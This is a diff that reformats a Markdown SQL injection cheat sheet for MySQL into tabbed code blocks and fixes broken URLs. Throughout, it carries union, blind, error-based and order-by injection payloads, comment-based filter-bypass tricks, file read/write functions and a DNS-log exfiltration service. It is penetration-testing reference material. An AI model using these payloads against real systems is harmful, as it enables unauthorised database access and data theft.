@@ -27,42 +27,38 @@
 - `concat_ws()`: usage is similar
 - `hex()` and `unhex()`: for hex encoding and decoding
 - `load_file()`: Read the file as text. In Windows, the path is set to `\\`
-- `select xxoo into outfile &#39;path&#39; `: can write files directly when the permission is high
+- `select xxoo into outfile 'path'`: can write files directly when the permission is high
 
 ## Grammar Reference and Tips
 
 ### Interline Notes
 
-- `--`
+=== "--"
+    ```sql
+    DROP
+    sampletable;--
+    ```
 
-```sql
-DROP
-sampletable;--
-```
-
-- `#`
-
-```sql
-DROP
-sampletable;#
-```
+=== "#"
+    ```sql
+    DROP
+    sampletable;#
+    ```
 
 ### Inline comment
 
-- `/* comment content */`
+=== "/* comment content */"
+    ```sql
+    DROP/*comment*/sampletable` DR/**/OP/* bypass filtering */sampletable`
+    SELECT/* replace spaces */password/**/
+    FROM/**/Members
+    ```
 
-```sql
-DROP/*comment*/sampletable` DR/**/OP/* bypass filtering */sampletable`
-SELECT/* replace spaces */password/**/
-FROM/**/Members
-```
-
-- `/*! MYSQL exclusive*/`
-
-```sql
-SELECT /*!32302 1/0, */ 1
-FROM tablename
-```
+=== "/*! MYSQL exclusive*/"
+    ```sql
+    SELECT /*!32302 1/0, */ 1
+    FROM tablename
+    ```
 
 ### String encoding
 
@@ -93,82 +89,75 @@ FROM information_schema.schemata;
 
 ### Table Name
 
-- union query
+=== "union query"
+    ```sql
+    --version=9 for MySQL 4 and version=10 for MySQL 5
+    UNION
+    SELECT GROUP_CONCAT(table_name)
+    FROM information_schema.tables
+    WHERE version = 10; /* Lists the tables in the current database*/
+    UNION
+    SELECT TABLE_NAME
+    FROM information_schema.tables
+    WHERE TABLE_SCHEMA = database(); /* Lists tables in all user-defined databases*/
+    SELECT table_schema, table_name
+    FROM information_schema.tables
+    WHERE table_schema!='information_schema' AND table_schema!='mysql';
+    ```
 
-```sql
---version=9 for MySQL 4 and version=10 for MySQL 5
-UNION
-SELECT GROUP_CONCAT(table_name)
-FROM information_schema.tables
-WHERE version = 10; /* Lists the tables in the current database*/
-UNION
-SELECT TABLE_NAME
-FROM information_schema.tables
-WHERE TABLE_SCHEMA = database(); /* Lists tables in all user-defined databases*/
-SELECT table_schema, table_name
-FROM information_schema.tables
-WHERE table_schema!='information_schema' AND table_schema!='mysql';
-```
+=== "blind"
+    ```sql
+    AND
+    SELECT SUBSTR(table_name, 1, 1)
+    FROM information_schema.tables > 'A'
+    ```
 
-- blind
-
-```sql
-AND
-SELECT SUBSTR(table_name, 1, 1)
-FROM information_schema.tables > 'A'
-```
-
-- Error
-
-```sql
-AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);
-AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
--- Successful in version 5.1.5.
-```
+=== "Error"
+    ```sql
+    AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);
+    AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
+    -- Successful in version 5.1.5.
+    ```
 
 ### Column name
 
-- union query
+=== "union query"
+    ```sql
+    UNION
+    SELECT GROUP_CONCAT(column_name)
+    FROM information_schema.columns
+    WHERE table_name = 'tablename'
+    ```
 
-```sql
-UNION
-SELECT GROUP_CONCAT(column_name)
-FROM information_schema.columns
-WHERE table_name = 'tablename'
-```
+=== "blind"
+    ```sql
+    AND
+    SELECT SUBSTR(column_name, 1, 1)
+    FROM information_schema.columns > 'A'
+    ```
 
-- blind
+=== "Error"
+    ```sql
+    -- Successful in version 5.1.5
+    AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
+    -- MySQL 5.1 has been fixed
+    AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);
+    AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
+    ```
 
-```sql
-AND
-SELECT SUBSTR(column_name, 1, 1)
-FROM information_schema.columns > 'A'
-```
-
-- Error
-
-```sql
--- Successful in version 5.1.5
-AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
--- MySQL 5.1 has been fixed
-AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);
-AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
-```
-
-- Use `PROCEDURE ANALYSIS ()`
-
-```sql
--- This requires a web display page with a field for the query you injected
--- Get the first paragraph name
-SELECT username, permission
-FROM Users
-WHERE id = 1;
-1 PROCEDURE ANALYSE()
--- Get the second section name
-1 LIMIT 1.1 PROCEDURE ANALYSIS ()
--- Get the third paragraph name
-1 LIMIT 2.1 PROCEDURE ANALYSIS ()
-```
+=== "Use PROCEDURE ANALYSIS ()"
+    ```sql
+    -- This requires a web display page with a field for the query you injected
+    -- Get the first paragraph name
+    SELECT username, permission
+    FROM Users
+    WHERE id = 1;
+    1 PROCEDURE ANALYSE()
+    -- Get the second section name
+    1 LIMIT 1.1 PROCEDURE ANALYSIS ()
+    -- Get the third paragraph name
+    1 LIMIT 2.1 PROCEDURE ANALYSIS ()
+    ```
 
 ### Query the table based on the column name
 
@@ -227,7 +216,7 @@ SELECT CASE WHEN 1 = 1 THEN true ELSE false END;
 
 ### Order by post injection
 
-`order by` Because it is a sort statement, you can use the conditional statement to make judgments, and judge the true
+`order by` is a sort statement, you can use the conditional statement to make judgments, and judge the true
 and false conditions according to the returned sorting result. Variables with `order` or `order by` are probably the
 kind of injections. When you know a field, you can do the following:
 
@@ -237,15 +226,13 @@ Sort according to the `vote` field. Find the ticket with the highest number of v
 link:
 
 ```sql
-http
-://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc
+http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc
 ```
 
 See if the sorting changes. There is another way to not know any field information, use the `rand` function:
 
 ```sql
-http
-://www.test.com/list.php?order=rand(true)
+http://www.test.com/list.php?order=rand(true)
 http://www.test.com/list.php?order=rand(false)
 ```
 
@@ -253,8 +240,7 @@ The above two will return different sorts, and the statement that determines whe
 name is less than 128 is as follows:
 
 ```sql
-http
-://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
+http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
 ```
 
 ### Wide byte injection
@@ -271,7 +257,7 @@ Not only in SQL injection, wide character injection can be applied in many place
 Simply put, put the information in the advanced domain name, pass it to yourself, then read the log and get the
 information.**
 
-Dnslog platform: [http://ceye.io/](<http://ceye.io/>)
+Dnslog platform: <http://ceye.io/>
 
 ```sql
 mysql
